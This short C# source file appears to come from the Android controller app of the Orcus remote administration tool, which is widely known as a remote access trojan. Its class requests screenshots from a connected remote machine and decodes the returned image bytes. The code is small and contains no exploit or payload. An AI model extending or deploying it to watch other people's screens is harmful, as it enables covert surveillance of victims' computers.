using System;
using Orcus.Shared.Commands.RemoteDesktop;
using System.IO;
using Android.Graphics;

namespace Orcus.Administration.App
{
	public class RemoteDesktopCommand : Command
	{
		public event EventHandler<Bitmap> ScreenshotReceived;
		public event EventHandler ErrorDecodingImage;

		public Bitmap CurrentImage {
			get;
			set;
		}

		public override void ResponseReceived (byte[] parameter)
		{
			switch ((RemoteDesktopCommunication)parameter [0]) {
			case RemoteDesktopCommunication.ResponseScreenshot:
				try {
					var oldImage = CurrentImage;
					ScreenshotReceived?.Invoke (this, CurrentImage  = BitmapFactory.DecodeByteArray (parameter, 1, parameter.Length - 1));
					oldImage?.Dispose();
				} catch (ArgumentException) {
					ErrorDecodingImage?.Invoke (this, EventArgs.Empty);
				}
				break;
			}
		}

		public void TakeScreenshot()
		{
			ConnectionInfo.SendCommand(this, new[] {(byte) RemoteDesktopCommunication.GetScreenshot});
		}

		protected override uint GetId()
		{
			return 14;
		}
	}
}